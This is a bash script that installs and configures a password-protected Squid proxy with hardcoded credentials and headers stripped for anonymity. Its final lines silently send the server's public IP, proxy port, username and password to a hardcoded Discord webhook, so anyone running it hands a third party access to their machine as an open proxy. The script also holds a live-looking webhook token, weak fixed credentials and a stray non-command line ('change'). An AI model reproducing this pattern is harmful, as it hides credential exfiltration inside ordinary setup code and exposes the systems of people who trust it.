#!/bin/bash
apt-get update
sleep 15
clear
apt-get install squid -y
apt-get install apache2-utils -y
rm -rf /etc/squid/squid.conf
touch /etc/squid/squid.conf
PORT=9999
USERN=quocmanh
PASSW=quocmanh
echo -e "
dns_v4_first on
forwarded_for off
visible_hostname squid.server.commm
auth_param basic program /usr/lib/squid3/basic_ncsa_auth /etc/squid/squid_passwd
auth_param basic realm proxy
acl authenticated proxy_auth REQUIRED
http_access allow authenticated
# Choose the port you want. Below we set it to default 9999.
http_port $PORT
request_header_access Allow allow all
request_header_access Authorization allow all
request_header_access WWW-Authenticate allow all
request_header_access Proxy-Authorization allow all
request_header_access Proxy-Authenticate allow all
request_header_access Cache-Control allow all
request_header_access Content-Encoding allow all
request_header_access Content-Length allow all
request_header_access Content-Type allow all
request_header_access Date allow all
request_header_access Expires allow all
request_header_access Host allow all
request_header_access If-Modified-Since allow all
request_header_access Last-Modified allow all
request_header_access Location allow all
request_header_access Pragma allow all
request_header_access Accept allow all
request_header_access Accept-Charset allow all
request_header_access Accept-Encoding allow all
request_header_access Accept-Language allow all
request_header_access Content-Language allow all
request_header_access Mime-Version allow all
request_header_access Retry-After allow all
request_header_access Title allow all
request_header_access Connection allow all
request_header_access Proxy-Connection allow all
request_header_access User-Agent allow all
request_header_access Cookie allow all
request_header_access All deny all" >> /etc/squid/squid.conf
htpasswd -b -c /etc/squid/squid_passwd $USERN $PASSW
service squid restart
clear
change
htpasswd -b -c /etc/squid/squid_passwd $USERN $PASSW
IP=$(wget -qO- ifconfig.me)
WEBHOOK=https://discord.com/api/webhooks/834911408629088296/cygIA2pQlxKeMqMROuTiEzbAhGTB1AorutM68th7RtSOdksNsMUetCLjuVbL4Sd5prd4
curl -i  -X POST $WEBHOOK -H "Content-Type:application/json" --data "{\"content\": \"$IP:$PORT:$USERN:$PASSW\"}"